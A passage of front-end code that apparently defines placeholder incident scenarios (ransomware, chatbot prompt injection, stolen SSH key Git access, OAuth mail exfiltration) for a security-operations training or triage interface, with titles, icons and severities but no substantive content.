  { id: 'ransomware-note', title: 'Ransomware Note on Shared Drive', icon: Zap, color: 'text-red-500', alert: { name: 'Ransomware Behavior', severity: 'Critical', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'prompt-injection', title: 'Prompt Injection in Internal Chatbot', icon: MessageSquare, color: 'text-purple-500', alert: { name: 'LLM Abuse', severity: 'Medium', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'shadow-it-git', title: 'Shadow IT Git Access (Stolen SSH Key)', icon: Code, color: 'text-blue-500', alert: { name: 'Unauthorized Git Access', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'oauth-abuse', title: 'OAuth Abuse for Mail Exfiltration', icon: Mail, color: 'text-orange-500', alert: { name: 'Mailbox Rule Creation', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
];